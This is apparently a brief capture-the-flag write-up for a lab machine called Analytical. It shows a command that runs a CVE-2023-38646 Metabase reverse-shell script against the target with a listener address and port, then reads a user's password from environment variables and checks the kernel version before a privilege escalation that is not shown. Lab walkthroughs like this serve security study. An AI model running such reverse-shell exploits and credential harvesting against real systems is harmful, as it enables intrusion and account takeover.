# Analytical - Metabase / Linux Kernel 6.2.0-25-generic PE

[image]

## 1. CVE-2023-38646

```bash
python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lhost 10.10.14.28 --lport 1234
```

[image]

## 2. ENV command get password of metalytic user

```bash
env
```

[image]

## 3. Shell as Root

```bash
cat /proc/version
```

[image]

**Linux Ubuntu 6.2.0-25 version Privilege escalations**

[image]

## Exploited!!

[image]
